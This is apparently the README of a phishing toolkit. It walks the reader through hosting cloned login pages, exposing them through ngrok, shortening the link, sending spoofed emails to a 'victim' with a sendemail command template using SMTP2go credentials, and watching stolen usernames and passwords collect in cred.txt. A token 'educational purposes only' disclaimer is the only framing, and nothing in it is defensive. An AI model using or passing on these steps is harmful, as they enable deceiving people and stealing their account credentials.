          ===============Welcome to Phishing Trap Tool===============
This is for educational purposes only.
The creator will not be responsible for any harm done with this tool.
-----------------------------------------------------------------------------------------------------------------------
How to use:-
----------------
First extract "Phishing_sites" folder
Then.....
1.Open your terminal and navigate to the folder where this tool is 
present.

2.Type :- chmod +x *

3.Type the following commands serially(Only statements between ""):-
"Python account.py"(For creating SMTP2go account).
"Python3 install.py"(For downloading all requirements).
"Python3 Rik.py"

4.Wait awhile until it shows "Initializing php",then press 'Enter'.
Type the path of the website you want to 'phishing attack' 
which you will find in the "Path.txt" file.

5.Again press 'Enter' then type the following serially:-
  "127.0.0.1:80"
  "80"
6.Then copy the ngrok.url and setup your spoofemail.py
and send to the victim.

if victim login in your page the password and user name automaticly saved in the txt file of website folder(which website you use)
--------------------------------------------------------------------------------------------------------------------------------------
How to short your ngrok url:-
------------------------------------
open another terminal in PhishingTrap folder
1.type command
"python shortlink.py"
then hit Enter
now open a website you can use it for short a link
----------------------------------------------------------------------------------------------------------------------------------------
How to send spoofemail:-
--------------------------
first open spoofemail.py in your text editor.

then you can seee this type of command :-sendemail -f (spoof email) -t (victim email) -u (subject of massage) -m (massage) -s mail.smtp2go.com:2525 -xu (smtp2go user email) -xp(smtp2go user password)

configure it here:------
(spoofemail)="any email adress" 
(victim email)="victim email adress"
(subject of massage)="name of the subject"
(massage)= "massage content"
(smtp2go user email)="your smtp2go registerd user name"
(smtp2go user password)="your smtp2go registerd password"
--------------------------------------------------------------------------------------------------------------------------------------------
How to see live Credential:-
--------------------------------
open a terminal 
1.type following commands
"cd (copy and pest any path from path.txt which website page you wnat to use)"
then hit 'enter'
then type
"tail -f cred.txt(notice the txt file name from folder)" 
------------------------------------------------------------------------------------------------------------------------------------------------

							


								Enjoy It
								



